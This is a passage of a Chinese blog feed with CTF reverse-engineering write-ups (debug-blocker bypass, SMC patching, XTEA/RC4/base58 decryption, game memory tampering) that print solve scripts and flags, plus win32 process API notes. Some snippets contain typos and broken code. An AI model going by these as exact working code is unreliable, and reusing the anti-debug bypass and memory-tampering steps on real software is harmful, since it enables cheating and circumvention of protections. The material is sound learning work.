src="https://i.loli.net/2021/05/24/N4Wouv9lYnLTRbr.png"><br>然后试值，这里我就直接用flag了，MRCTF{Andr01d_check1n_welc0me_to_MRCTF}<br><img src="https://i.loli.net/2021/05/24/D6Mpbvalxwm1Y95.png"><br>停在断点处<br><img src="https://i.loli.net/2021/05/24/ioJMmqv4BOjsP38.png"></p><h2 id="MR-register"><a href="#MR-register" class="headerlink" title="MR_register"></a>MR_register</h2><p>是一个Debug Blocker，这个内容和《逆向工程核心原理》的api钩取第一节内容有相似部分</p><pre><code>双进程保护，实际上是程序本身作为一个进程或一个调试器，并且在调试模式下运行自身程序。所以这种保护通常就会存在两个进程。这种程序的技术特点是1. 无法被调试，因为程序本身也是一个调试器。我们又知道一般情况下一个程序只能被一个调试器所调试，如果他的程序先抢占作为了调试器，那么就无法进行调试。所以解决办法只能是在他的调试器附加之前你先开始调试。2. 一般来说，为了防止你直接抢占调试来绕过，他还会加一个异常处理函数，程序中原本存在一些不合理的代码或者 INT3 断点，当他的调试器处理的时候会去做一些指定的流程，而你作为调试者，在调试过程中就无法处理那些代码。</code></pre><p>这样一个进程里面就有两个进程了。而且父进程应该是作为的调试器，然后通过动调可以发现调试器处理了出题人故意在子进程中设置的3个异常。从而恢复了子进程的真实代码。</p><p>通过动调可知，发生了3个异常，以及异常相关位置，也就是context.eip的值</p><p>1.一个异常是除0异常，这个异常改变了子函数的最后对比的密文</p><pre><code>405020  for ( i = 374; i &gt;= 0; --i )    Buffer[i] ^= Buffer[i + 1] ^ i;  Buffer[375] = 120;</code></pre><p>2.第二个是int3异常，这个异常有一个smc的处理，还原了子进程的函数</p><pre><code>401E1F    for ( i = 0; i &lt;= 0x57D; ++i )      *((_BYTE *)v5 + i) ^= i;</code></pre><p>3.第3个也是int3异常，跳过了，异常位置</p><pre><code>patch掉相关位置就ok</code></pre><p>第一个异常的处理我是将动调后的数据，直接改到了原exe文件的二进制数据的位置。</p><p>第二个就直接idapython</p><pre><code>//from ida_bytes import *//patch_byte(0x0040169A, 0x90)版本1：#include &lt;idc.idc&gt;static main()&#123;    auto addr = 0x401E1F;    auto i = 0;    for(i=0;i&lt;0x57E;i++)&#123;        PatchByte(addr + i,Byte(addr + i) ^i);    &#125;&#125;版本2：import idcst = 0x401E1fi = 0while st &lt;= 0x401E1f+0x57d:    value = ida_bytes.get_byte(st)    value ^= (i%256)    ida_bytes.patch_byte(st, value)    st += 1    i += 1版本3：import idcdef XorBytes(start, length):    for i in range(length):        byte_value = ord(idc.get_bytes(start + i, 1)[0])        print i, hex(byte_value)        byte_value = byte_value ^ i        idc.patch_byte(start + i, byte_value)XorBytes(0x0000000000401E1F, 0x57D)版本4：(只适用于ida7.0)import sysfrom idautils import *from idc import *import idaapiif __name__ ==&quot;__main__&quot;:    start_addr=0x401E1f    for i in range(0x57E):        PatchByte(start_addr+i,Byte(start_addr+i)^i)</code></pre><p>然后就去掉一些花指令就可以看代码了</p><p>先爆破得到source</p><pre><code>#include &lt;stdio.h&gt;char enc[] = &#123;71, 90, 53, 121, 69, 120, 71, 105, 71, 88, 69, 120, 53, 122, 71, 88, 69, 120, 71, 87, 72, 108, 72, 108, 69, 120, 71, 88, 53, 119, 71, 86, 69, 120, 71, 90, 53, 119, 71, 89, 69, 120, 71, 107, 53, 118, 71, 106, 69, 120, 53, 120, 72, 108, 53, 121, 69, 120, 71, 87, 71, 90, 53, 118, 71, 87, 69, 120, 71, 88, 71, 87, 72, 108, 53, 121, 69, 120, 71, 89, 71, 106, 53, 118, 71, 107, 69, 120, 71, 105, 72, 108, 71, 106, 71, 90, 69, 120, 72, 108, 53, 84, 72, 108, 71, 86, 69, 120, 53, 122, 72, 108, 71, 90, 71, 89, 69, 120, 71, 87, 71, 107, 72, 108, 71, 88, 71, 107, 69, 120, 71, 88, 71, 106, 71, 86, 72, 109, 53, 121, 69, 120, 71, 89, 53, 121, 72, 109, 71, 88, 71, 106, 69, 120, 71, 106, 71, 89, 53, 118, 71, 89, 72, 108, 69, 120, 53, 118, 71, 87, 71, 89, 53, 120, 71, 105, 69, 120, 71, 87, 71, 86, 71, 90, 53, 122, 71, 105, 53, 120, 69, 120, 71, 87, 53, 118, 71, 106, 71, 88, 71, 105, 71, 88, 69, 120, 71, 88, 53, 118, 53, 119, 71, 87, 71, 88, 71, 88, 69, 120, 71, 90, 71, 105, 71, 87, 71, 89, 53, 119, 71, 89, 69, 120, 71, 106, 53, 84, 53, 120, 71, 105, 71, 89, 71, 90, 69, 120, 53, 119, 71, 90, 53, 121, 72, 109, 71, 105, 71, 105, 69, 120, 71, 87, 71, 88, 71, 90, 72, 109, 53, 122, 53, 119, 72, 109, 69, 120, 71, 87, 53, 121, 72, 109, 71, 107, 72, 108, 71, 106, 53, 121, 69, 120, 71, 88, 53, 84, 53, 122, 71, 87, 71, 107, 72, 109, 53, 121, 69, 120, 71, 90, 53, 121, 71, 107, 72, 109, 71, 86, 71, 106, 53, 119, 69, 120, 71, 107, 53, 121, 71, 105, 53, 118, 72, 108, 71, 90, 71, 87, 69, 120, 53, 120, 53, 118, 53, 121, 71, 89, 72, 108, 53, 120, 53, 121, 69, 120, 71, 87, 71, 90, 72, 108, 71, 88, 53, 122, 71, 87, 72, 108, 53, 119, 69, 120&#125;;char table[9][9] = &#123;&quot;ABCDEFGH&quot;, &quot;12345678&quot;, &quot;0IJKLMNO&quot;, &quot;+OPQRStu&quot;,                    &quot;\\vwxyzTU&quot;, &quot;abcdefgh&quot;, &quot;VWXYZijk&quot;, &quot;lmnopqrs&quot;&#125;;int main(void)&#123;    int i,num1,num2,j,v25,code1,code2;    char ch;    for(i=0;i&lt;sizeof(enc)-1;i+=2)    &#123;        for(j=32;j&lt;127;j++)         &#123;            ch=j;            num1=(ch&gt;&gt;6)&amp;1;            num2=(ch&gt;&gt;3)&amp;7;            v25=ch&amp;7;            code1=table[num1][num2];            code2=table[num2][v25];            if(code1==enc[i]&amp;&amp;code2==enc[i+1])            &#123;                putchar(ch);                break;            &#125;        &#125;    &#125;&#125;//4d#52#e2#188#2b0#4b3#7a6#c8d#14a1#218d#36a7#5864#8f80#e843#17827#2609d#3d926#63a38#a13c5#104e5c#1a6252#2ab122#4513b3#6fc534#b4d955#1249eb9#1d9786d#2fe179d#4d7906b#7d5a841#cad38cd#1482e18b#</code></pre><p>注意上面的enc是1byte，这个和最后的比较部分有关。然后用python将#替换为0x</p><pre><code>s=&#39;4d#52#e2#188#2b0#4b3#7a6#c8d#14a1#218d#36a7#5864#8f80#e843#17827#2609d#3d926#63a38#a13c5#104e5c#1a6252#2ab122#4513b3#6fc534#b4d955#1249eb9#1d9786d#2fe179d#4d7906b#7d5a841#cad38cd#1482e18b#4d&#39;print(s.replace(&#39;#&#39;,&#39;,0x&#39;))//0x4d,0x52,0xe2,0x188,0x2b0,0x4b3,0x7a6,0xc8d,0x14a1,0x218d,0x36a7,0x5864,0x8f80,0xe843,0x17827,0x2609d,0x3d926,0x63a38,0xa13c5,0x104e5c,0x1a6252,0x2ab122,0x4513b3,0x6fc534,0xb4d955,0x1249eb9,0x1d9786d,0x2fe179d,0x4d7906b,0x7d5a841,0xcad38cd,0x1482e18b,0x4d</code></pre><p>最后解密</p><pre><code>#include &lt;stdio.h&gt;int main(void)&#123;    int i;    unsigned int enc[]=&#123;0x4d,0x52,0xe2,0x188,0x2b0,0x4b3,0x7a6,0xc8d,0x14a1,0x218d,0x36a7,0x5864,0x8f80,0xe843,0x17827,0x2609d,0x3d926,0x63a38,0xa13c5,0x104e5c,0x1a6252,0x2ab122,0x4513b3,0x6fc534,0xb4d955,0x1249eb9,0x1d9786d,0x2fe179d,0x4d7906b,0x7d5a841,0xcad38cd,0x1482e18b,0x4d&#125;;    char flag[50];    flag[0]=0x4d;    flag[1]=0x52;    for(i=2;i&lt;100;i++)    &#123;        flag[i]=enc[i]-enc[i-1]-enc[i-2];    &#125;    puts(flag);&#125;//MRCTF&#123;C4n_y0u_d3bug_1t?_n0_wa9!&#125;</code></pre><h2 id="ezgame"><a href="#ezgame" class="headerlink" title="ezgame"></a>ezgame</h2><p>用ce来分析相关过关条件的地址</p><pre><code>星星：xxxxxxxxx3E40  4bytekey：xxxxxxxxx3E48   8bytedoor，cookie，alien：xxxxxxxxxx3E68  4个char，01代表truedeath：xxxxxxxxxx3E6C 4byte</code></pre><p>直接改星星数被cheat，原因是每吃一个星星，key就会发生变换，所以关键就是要知道key是怎么变的。</p><p>dump出来，找到位置，c写出来的key变换过程</p><pre><code>#include&lt;stdio.h&gt;__int64 key = 0xDEADBEEFAA114514;int encode()&#123;    int i,j;    __int64 v10,v12;    char v13;    unsigned __int64 v14;    for(i=0;i&lt;4;i++)    &#123;        v10=0;        v12=1;        for(j=0;j&lt;64;j++)        &#123;            v13 = j &amp; 0x3f;            v14 = v12 &amp; key;            v12 = (v12&lt;&lt;1)|(v12&gt;&gt;63);            v10 ^= v14&gt;&gt;v13;        &#125;        key=v10 | 2 * key;    &#125;    &#125;int main()&#123;    int i;    for(i=0;i&lt;105;i++)    &#123;        encode();    &#125;    printf(&quot;0x%llX&quot;, key);&#125;//0xEA8451453BD5B7DD</code></pre><p>然后再去改数据即可得到MRCTF{Ez_G@mE_MaY_Be_Ha3d_4_y0U}</p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> wp </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>虎符ctf的wp&amp;红明谷杯的wp</title>
      <link href="2021/04/09/%E8%99%8E%E7%AC%A6ctf&amp;%E7%BA%A2%E6%98%8E%E8%B0%B7%E7%9A%84wp/"/>
      <url>2021/04/09/%E8%99%8E%E7%AC%A6ctf&amp;%E7%BA%A2%E6%98%8E%E8%B0%B7%E7%9A%84wp/</url>
      
        <content type="html"><![CDATA[<h1 id="虎符ctf的wp-amp-红明谷杯的wp"><a href="#虎符ctf的wp-amp-红明谷杯的wp" class="headerlink" title="虎符ctf的wp&amp;红明谷杯的wp"></a>虎符ctf的wp&amp;红明谷杯的wp</h1><p>大型比赛的题确实有难度，赛后看wp学习了一下，不得不说自己做的时候真的很懵逼。吐槽一下go语言题太多了。。。</p><h2 id="gocrypt"><a href="#gocrypt" class="headerlink" title="gocrypt"></a>gocrypt</h2><p>输入的flag要满足go语言的regexp_MustCompileregexp___Regexp__FindStringSubmatch规定的格式，然后两轮xtea加密。</p><p>动调来看看整个过程。</p><p>cherk函数，go语言相关知识点<a href="https://ask.csdn.net/questions/1032787">https://ask.csdn.net/questions/1032787</a>，<a href="https://blog.csdn.net/weiyuefei/article/details/78589764">https://blog.csdn.net/weiyuefei/article/details/78589764</a><br><img src="https://i.loli.net/2021/04/06/x9lTWYyL2nbGzwS.png"><br>所以说flag要满足类似的形式flag{aaaaaaaa-aaaa-aaaa-1111-111111111111}，继续往下看<br><img src="https://i.loli.net/2021/04/06/eJckLby5vN82Pot.png"><br>然后回到主函数，继续调几步就是变了delat的xtea加密函数<br><img src="https://i.loli.net/2021/04/06/6Vy2QopOUvzsi8H.png"><br>进入函数，会很明显的知道这是个xtea加密，所以只需要找到key和delat和加密后的数据存放的位置就可以了<br><img src="https://i.loli.net/2021/04/06/xagM1BeiFKAw4pY.png"><br>在后面下一个断点，看看加密数据存放的位置<br><img src="https://i.loli.net/2021/04/06/zgSPiZwrdB7tfae.png"><br>后面又有一组xtea加密，就直接跳过了，加密后的数据也是在那个位置。<br>就直接看比较函数了。<br><img src="https://i.loli.net/2021/04/06/iXYkDpRCFrqu9ao.png"></p><p>exp</p><pre><code>//flag&#123;aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa&#125;//flag&#123;aaaaaaaa-aaaa-aaaa-1111-111111111111&#125;//flag&#123;11111111-1111-1111-1111-111111111111&#125; C00005E190,C000060780void decrypt(unsigned int r ,unsigned int *code ,unsigned int *key)&#123;    unsigned int v0,v1,i,delta=0x12345678;    unsigned int sum=delta*r;    v0=code[0];    v1=code[1];    for(i=0;i&lt;r;i++)    &#123;        v1-=( ((v0&lt;&lt;4) ^(v0&gt;&gt;5)) +v0 ) ^ ( sum + key[ (sum&gt;&gt;11)&amp;3 ]);        sum-=delta;        v0-=( ((v1&lt;&lt;4) ^ (v1&gt;&gt;5)) +v1 ) ^ ( sum + key[sum&amp;3] );    &#125;    code[0]=v0;    code[1]=v1;&#125;#include&lt;stdio.h&gt;int main()&#123;    unsigned int key[4]=&#123;0x10203,0x4050607,0x8090a0b,0xc0d0e0f&#125;;    unsigned int r=32;    unsigned int code[2]=&#123;F011C30E，F39AC745&#125;;// 0x10D9F5ED,0xCB022754   decrypt(r,code,key);   printf(&quot;%02x %02x&quot;,code[0],code[1]); &#125;//flag&#123;6ab84d0a-d2f3-le6f-15fd147da714fd6f&#125;</code></pre><p>注意小端序就ok</p><h2 id="re"><a href="#re" class="headerlink" title="re"></a>re</h2><p>mips架构，32位IDA7.5打开，反编译后会看到很多c++写的东西，里面主要的函数也就是pre和server_check_redemption_code，然后数据也就两个字符串，pre函数内部实际上是和主函数差不多的。下面先看看一些c++反编译出来的怎么理解。</p><pre><code>std::operator&lt;&lt;&lt;std::char_traits&lt;char&gt;&gt;(&amp;std::cout, &quot;your redemption code: &quot;, envp);//这种有&amp;std::cout，是输出，类似printfstd::getline&lt;char,std::char_traits&lt;char&gt;,std::allocator&lt;char&gt;&gt;(&amp;std::cin, v11);//这种有&amp;std::cin的是输入std::__cxx11::basic_string&lt;char,std::char_traits&lt;char&gt;,std::allocator&lt;char&gt;&gt;::basic_string(a,b,c)//即 strncpy(a, b, lenth) 第三个参数可选std::allocator&lt;char&gt;::allocator(a)//相当于malloc(a)，a是大小std::allocator&lt;char&gt;::~allocator(a)//相当于free(a)std::__cxx11::basic_string&lt;char,std::char_traits&lt;char&gt;,std::allocator&lt;char&gt;&gt;::length(a1)//求字符串长度，类似strlen(a1)*(char *)std::__cxx11::basic_string&lt;char,std::char_traits&lt;char&gt;,std::allocator&lt;char&gt;&gt;::operator[](a2, i)//相当于a2[i]</code></pre><p>下面对主函数进行分析<br><img src="https://i.loli.net/2021/04/07/pTZNYVHUbEWt3KD.png"></p><p>下面对server_check_redemption_code进行分析<br><img src="https://i.loli.net/2021/04/07/cCGMN9uk6aR5qAT.png"><br>刚开始我还因为有多解，因为如果只需要函数值返回7的话，那么只需要让k=20，所以前13个字符随便取前面的都ok了，但是忽略了pre这个函数，这个函数里面的server_check_redemption_code函数不能返回-1，这就意味着，flag一定在pre函数的那个字符串中有。所以flag只会有一个。</p><p><img src="https://i.loli.net/2021/04/07/w9n8TKk6btX7CAB.png"></p><p>所以直接在”I Love Ninja Must Die”这个字符串中找和”Ninja Must Die 3 Is A Cruel Game, So Hard For Me”相同的部分就是flag</p><p>得到flag{Ninja Must Die}</p><p>C语言写的server_check_redemption_code大致过程</p><pre><code>#include&lt;stdio.h&gt;#include&lt;string.h&gt;int main(void)&#123;    int i,j,v4,v7;    int s[0xe][256]=&#123;0,&#125;;        int flag[14]=&#123;&#39;a&#39;,&#39;a&#39;,&#39;a&#39;,&#39;a&#39;,&#39;a&#39;,&#39;a&#39;,&#39;a&#39;,&#39;a&#39;,&#39;a&#39;,&#39;a&#39;,&#39;a&#39;,&#39;a&#39;,&#39;a&#39;,&#39;a&#39;,&#125;;    char table[]=&quot;I Love Ninja Must Die 3. Beautiful Art And Motive Operation Is Creative.&quot;;    memset(s, 0,0xe*256);    s[0][flag[0]]=1;    v4=0;    for(i=1;i&lt;0xE;i++)    &#123;        for(j=0;j&lt;256;j++)        &#123;            if(j==flag[i])                s[i][j]=s[v4][j];            else                s[i][j]=i+1;        &#125;        v4=s[v4][(flag[i])];    &#125;    v7=0;    for(i=0;i&lt;strlen();i++)    &#123;        v7=s[v7][table[k]]        if(v7=14)            rerutn k-14+1;    &#125;&#125;</code></pre><h2 id="CrackMe"><a href="#CrackMe" class="headerlink" title="CrackMe"></a>CrackMe</h2><p>动调，flag有17个，通过两个while(1)被分为7，和10。我测试的flag是abcdefghijklmnopq</p><p>第一个while<br><img src="https://i.loli.net/2021/04/08/xlVnTaAyr2YDI7M.png"><br>第二个while<br><img src="https://i.loli.net/2021/04/08/G6q34mRYoCysFkP.png"><br>然后需要输入一个值<br><img src="https://i.loli.net/2021/04/08/bhCA2cPD4SepfV3.png"><br>爆破，参考了别人的脚本，爆破的是商，然后*12379+余数，确实比较好，思路很6逼，大大减少了爆破的时间</p><pre><code>#include&lt;stdio.h&gt;#include&lt;math.h&gt;double sub_7FF6110D1360(double a,double b)&#123;    double c;    c=pow(a,b-1);    return c/exp(a);&#125;int main()&#123;    int i=0,j=0;    double v19;    double v22;    double v16=0.0;    while(1)    &#123;        double v17=0.0;        double v18=0.0;        int v20;        v19 = (double)i + 1.0;        do        &#123;            v17= v17 + sub_7FF6110D1360(v18, v19)* 0.001;            v18 = v18 + 0.001;        &#125;while(v18 &lt;= 100.0);        v20 = (int)(v17 + v17 + 3.0);        if(v20==0x13b03)        &#123;            //printf(&quot;%d&quot;,i);            break;        &#125;        else        &#123;            //printf(&quot;%d&quot;,i);        &#125;        i++;    &#125;    while(1)    &#123;        double v21=0.0;        v16=0.0;        v22=j+1.0;        do        &#123;            v16 = v16 + sub_7FF6110D1360(v21, v22) * 0.001;            v21 = v21 + 0.001;        &#125;while( v21 &lt;= 100.0 );        if((int)(v16 + v16 + 3.0)==0x5a2)        &#123;            //printf(&quot;%d&quot;,j);            break;        &#125;        j++;    &#125;        printf(&quot;%d&quot;,i*12379+j);&#125;//99038</code></pre><p>继续看后面，异或处理了前7个字符。<br><img src="https://i.loli.net/2021/04/08/tQJbVoXzZ6RUAai.png"><br>先解出来</p><pre><code>#include&lt;stdio.h&gt;int main()&#123;    int code[7]=&#123;0x08, 0x4D, 0x59, 0x06, 0x73, 0x02, 0x40&#125;;    int key[7]=&#123;0x39,0x39,0x30,0x33,0x38,0x31,0x39&#125;;    int flag[7];    int i ;    for(i=0;i&lt;7;i++)    &#123;        flag[i]=code[i]^key[i];        printf(&quot;%c&quot;,flag[i]);    &#125;&#125;//1ti5K3y</code></pre><p>然后是rc4加密后面10个字符，key为前7个，没有魔改<br><img src="https://i.loli.net/2021/04/08/xFYX4AlDecaZjHs.png"><br>网上脚本直接解</p><pre><code>//程序开始#include&lt;stdio.h&gt;#include&lt;string.h&gt;typedef unsigned longULONG;/*初始化函数*/void rc4_init(unsigned char*s, unsigned char*key, unsigned long Len)&#123;    int i = 0, j = 0;    char k[256] = &#123; 0 &#125;;    unsigned char tmp = 0;    for (i = 0; i&lt;256; i++)    &#123;        s[i] = i;//做一道re的题时这里就改为了，s[i]=256-i        k[i] = key[i%Len];    &#125;    for (i = 0; i&lt;256; i++)    &#123;        j = (j + s[i] + k[i]) % 256;        tmp = s[i];        s[i] = s[j];//交换s[i]和s[j]        s[j] = tmp;    &#125;&#125;void rc4_crypt(unsigned char*s, unsigned char*Data, unsigned long Len)&#123;    int i = 0, j = 0, t = 0;    unsigned long k = 0;    unsigned char tmp;    for (k = 0; k&lt;Len; k++)    &#123;        i = (i + 1) % 256;        j = (j + s[i]) % 256;        tmp = s[i];        s[i] = s[j];//交换s[x]和s[y]        s[j] = tmp;        t = (s[i] + s[j]) % 256;        Data[k] ^= s[t];    &#125;&#125;int main()&#123;    unsigned char s[256] = &#123; 0 &#125;, s2[256] = &#123; 0 &#125;;//S-box    char key[256] = &#123; &quot;1ti5K3y&quot; &#125;;    char pData[512] = &#123;0xB2, 0xD6, 0x8E, 0x3F, 0xAA, 0x14, 0x53, 0x54, 0xC6&#125;;    unsigned long len = strlen(pData);    int i;    rc4_init(s, (unsigned char*)key, strlen(key));//已经完成了初始化    for (i = 0; i&lt;256; i++)//用s2[i]暂时保留经过初始化的s[i]，很重要的！！！    &#123;        s2[i] = s[i];    &#125;    //rc4_init(s,(unsignedchar*)key,strlen(key));//初始化密钥    rc4_crypt(s2, (unsigned char*)pData, len);//解密    printf(&quot;pData=%s&quot;, pData);    return 0;&#125;//RC4_crypt</code></pre><p>得到flag{1ti5K3yRC4_crypt}</p><h2 id="g0"><a href="#g0" class="headerlink" title="g0"></a>g0</h2><p>go语言写的exe，用了脚本后还是看不到main_main函数，估计是用了什么东西吧，但是动调可以找到相关函数的位置，然后进去p键一些地方，点进去一些函数又点出来，多试几次就可以看到反编译出来的逻辑了。</p><p>先看大致流程<br><img src="https://i.loli.net/2021/04/09/dgwL7qUIJQCxhnz.png"></p><p>首先是交换位置，将20个字符分为4组，每组5个，假设序号为1234，就变为了2431。<br><img src="https://i.loli.net/2021/04/09/PfnyrUk5Jhjxo3i.png"><br>然后就是base58加密，特征有长度，和变表<br><img src="https://i.loli.net/2021/04/09/zrKg7PAq4SMb2yd.png"><br>进入main_Encode</p><p>特征1：长度<br><img src="https://i.loli.net/2021/04/09/dA7qfaQwe452H9z.png"><br>特征2：表<br><img src="https://i.loli.net/2021/04/09/cvrBFJ7PhgdwblM.png"><br>最后就是跳过if检测，进入比较函数看密文了<br><img src="https://i.loli.net/2021/04/09/Z6iubs5CXg2xWl1.png"><br>进入main_main_func1<br><img src="https://i.loli.net/2021/04/09/wV17R5USEoaGvFA.png"></p><p>exp</p><pre><code>import base58code=&#39;2GVdudkYo2CBXoQii7gfpkjTc4gT&#39;table1=&#39;12Nrst6CDquvG7BefghJKLMEFHPQZabRSTUVmyzno89ApwxWXYcdkij345&#39;table2=&#39;123456789ABCDEFGHJKLMNPQRSTUVWXYZabcdefghijkmnopqrstuvwxyz&#39;code2=&#39;&#39;flag1=&#39;&#39;flag=&#39;&#39;for i in range(len(code)):    for j in range(len(table1)):        if code[i]==table1[j]:            code2+=table2[j]            breakprint(code2)flag1=base58.b58decode(code2)flag=flag1[15:20]+flag1[0:5]+flag1[10:15]+flag1[5:10]print(flag)//flag&#123;We1CTFc0m_2345&#125;</code></pre>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> wp </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>win32编程学习笔记</title>
      <link href="2021/03/30/win32%E7%BC%96%E7%A8%8B%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
      <url>2021/03/30/win32%E7%BC%96%E7%A8%8B%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/</url>
      
        <content type="html"><![CDATA[<h2 id="win32-API编程学习笔记"><a href="#win32-API编程学习笔记" class="headerlink" title="win32 API编程学习笔记"></a>win32 API编程学习笔记</h2><h3 id="win32的变量类型"><a href="#win32的变量类型" class="headerlink" title="win32的变量类型"></a>win32的变量类型</h3><p><a href="https://www.cnblogs.com/happycat1988/archive/2013/04/14/3020820.html">https://www.cnblogs.com/happycat1988/archive/2013/04/14/3020820.html</a></p><h3 id="win32中的宽字符"><a href="#win32中的宽字符" class="headerlink" title="win32中的宽字符"></a>win32中的宽字符</h3><p>视频主要讲了MessageBox()这个API函数吧</p><pre><code>#include&lt;stdio.h&gt;#include&lt;windows.h&gt;int main()&#123;    /*    int MessageBox(        HWND hWND,   //handle to owner window   句柄         LPCSTR IpText,  //text in message box  内容         LPCSTR IpCption, //message box title  窗口的标题         UINT uType       //message box style  窗口的格式         )      *///    CHAR message[]=&quot;hellow world&quot;;//    CHAR title[]=&quot;messagebox&quot;;//    MessageBoxA(NULL,message,title,MB_OK);   /*ASCALL   单位为一个字节*/ //    WCHAR message[]=L&quot;hellow world&quot;;//    WCHAR title[]=L&quot;messagebox&quot;;//    MessageBoxW(NULL,message,title,MB_OK);   /*unicode  一个单位为两个字节*///    TCHAR message[]=TEXT(&quot;hellow world&quot;);//    TCHAR title[]=TEXT(&quot;messagebox&quot;);//    MessageBox(NULL,message,title,MB_OK);    /*可以根据项目的要求来决定是什么编码方式*/    return 0;&#125;</code></pre><h3 id="进程的创建过程"><a href="#进程的创建过程" class="headerlink" title="进程的创建过程"></a>进程的创建过程</h3><p><strong>1.什么是进程？</strong></p><p>进程提供程序所需的资源，如：数据，代码(dll文件这些)。需要注意的是只提供资源，而使用这些资源是线程做的事情，任何进程都是别的进程创建的，使用了CreateProcess()这个函数，然后第一个进程是内核创建的。</p><p><strong>2.进程内存空间的地址划分</strong></p><p>可以在调试器(od,xdbg)里面大致查看，下面是分区。</p><pre><code>空指针赋值区    0x00000000--0x0000FFFF   //就是全是空的，一般不会使用这一部分用户模式区      0x00010000--0x7FFEFFFF   //我们使用的地方，加载exe，和dll的，这个过程应该发生了基地址重定位。64kb禁入区      0x7FFF0000--0X7FFFFFFF   //也是空的，我们和系统都不会用的地方内核            0x80000000--0xFFFFFFFF   //内核系统占用的地方，这些内核是不会变的</code></pre><p><strong>3.进程的创建过程</strong></p><pre><code>1.映射EXE文件2.创建内核对象EPROCESS3.映射系统Dll(ntdll.dll)  //映射的第一个dll4.创建线程内核对象ETHREAD5.系统启动线程    映射DLL(ntdll.LdrlnitializeThunk)  //应该是加载其他的dll这些，然后有些dll也会加载它们需要的dll，这也是为什么进程里面有很多dll    线程开始执行</code></pre><p><img src="https://i.loli.net/2021/03/03/6RJTyeML1xXn2b7.png"><br>如果熟悉这些过程，就可以较好的理解dll注入这些技术手段。</p><h3 id="创建进程"><a href="#创建进程" class="headerlink" title="创建进程"></a>创建进程</h3><p>主要就是CreateProcess()这个API</p><pre><code>BOOL CreateProcess(    LPCTSTR lpApplicationName,  //指向一个NULL结尾的、用来指定可执行模块的字符串。    LPTSTR lpCommandLine,  //指向一个以NULL结尾的字符串，该字符串指定要执行的命令行。    LPSECURITY_ATTRIBUTES lpProcessAttributes,    LPSECURITY_ATTRIBUTES lpThreadAttributes,    BOOL bInheritHandles,    DWORD dwCreationFlags,    LPVOID lpEnvironment,    LPCTSTR lpCurrentDirectory,    LPSTARTUPINFO lpStartupInfo,  //STARTUPINFO，指定一个STARTUPINFO结构，其中包含了创建进程时使用的附加信息    LPPROCESS_INFORMATIONlpProcessInformation   //PROCESS_INFORMATION，该结构用于容纳新进程的进程和线程标识符。大多数情况下，一旦这个函数返回，父应用程序都会关闭两个句柄。);</code></pre><p>然后就是两个结构体</p><pre><code>  typedef struct _PROCESS_INFORMATION &#123;    HANDLE hProcess;  //两个句柄    HANDLE hThread;    DWORD dwProcessId;   //两个id    DWORD dwThreadId;  &#125; PROCESS_INFORMATION, *PPROCESS_INFORMATION, *LPPROCESS_INFORMATION;  typedef struct _STARTUPINFOA &#123;    DWORD cb;   //第一个是用来储存这个结构体的size的。    LPSTR lpReserved;    LPSTR lpDesktop;    LPSTR lpTitle;    DWORD dwX;    DWORD dwY;    DWORD dwXSize;    DWORD dwYSize;    DWORD dwXCountChars;    DWORD dwYCountChars;    DWORD dwFillAttribute;    DWORD dwFlags;    WORD wShowWindow;    WORD cbReserved2;    LPBYTE lpReserved2;    HANDLE hStdInput;    HANDLE hStdOutput;    HANDLE hStdError;  &#125; STARTUPINFOA, *LPSTARTUPINFOA;</code></pre><p>例子</p><pre><code>#include&lt;stdio.h&gt;#include&lt;windows.h&gt;BOOL CreateChildProcess(PTCHAR szChildname,PTCHAR szCommandLine)&#123;    STARTUPINFO si;    PROCESS_INFORMATION pi;    ZeroMemory(&amp;pi,sizeof(pi));//用来将指定的内存块清零。    ZeroMemory(&amp;si,sizeof(si));    si.cb =sizeof(si);    if(!CreateProcess(        szChildname,        szCommandLine,        NULL,  //不继承进程句柄        NULL,  //不继承线程句柄        FALSE, //不继承句柄         0,     //没有创建标志，常用的有一个CREATE_SUSPENDED，立即挂起新进程。除非调用了ResumeThread函数函数，否则它不会恢复运行。可以用来干坏事。        NULL,        NULL,        &amp;si,        &amp;pi)    )    &#123;        printf(&quot;CreateChildProcess Error%d&quot;,GetLastError());   //用来返回大概错误信息        return FALSE;    &#125;    CloseHandle(pi.hProcess);   //关闭句柄    CloseHandle(pi.hThread);    return TRUE;&#125;int main(int argc,char*argv[])&#123;    TCHAR lpApplicationName[]=TEXT(&quot;C:/Program Files/Mozilla Firefox/firefox.exe&quot;);    TCHAR lpCommandLine[]=TEXT(&quot; https://the_itach1.gitee.io/&quot;);    CreateChildProcess(lpApplicationName,lpCommandLine);    getchar();    return 0;&#125;</code></pre><p>其中一些函数的解释</p><p><strong>ZeroMemory()</strong></p><p>ZeroMemory只是将指定的内存块清零。<br>使用结构前清零，而不让结构的成员数值具有不确定性，是一个好的编程习惯。</p><pre><code>void ZeroMemory( PVOID Destination,SIZE_T Length );Destination :指向一块准备用0来填充的内存区域的开始地址。Length :准备用0来填充的内存区域的大小，按字节来计算。</code></pre><h3 id="句柄与id"><a href="#句柄与id" class="headerlink" title="句柄与id"></a>句柄与id</h3><p>内核对象</p><p>像进程，线程，文件，互斥体，事件等在内核都有一个对应的结构体，这些结构体由内核负责管理，我们管这样的对象叫做内核对象。<br><img src="https://i.loli.net/2021/03/04/N91iX5qbzGMSKjv.png"></p><p>句柄表</p><p>每个进程里面都有一个句柄表，根据索引可以找到像对应的内核对象(结构体)，比如说File，Process，Thread，Event….。句柄应该就指向对应的内核对象。</p><p>特别的是操作系统有一个特殊的句柄，叫做全局句柄表。<br><img src="https://i.loli.net/2021/03/04/NcJTGi67zhjDB9r.png"></p><p>ID</p><p>ID可以理解为就是每一个进程的编号，是不会变的。<br><img src="https://i.loli.net/2021/03/04/SQqh2uGOo3j7mTx.png"></p><h3 id="进程相关API"><a href="#进程相关API" class="headerlink" title="进程相关API"></a>进程相关API</h3><p><strong>SuspendThread()</strong></p><p>SuspendThread，暂停指定的线程。</p><pre><code>DWORD WINAPI SuspendThread(　　_In_HANDLE hThread　　);</code></pre><p><strong>ResumeThread()</strong></p><p>ResumeThread，启动指定的线程。</p><pre><code>DWORD WINAPI ResumeThread(_In_ HANDLE 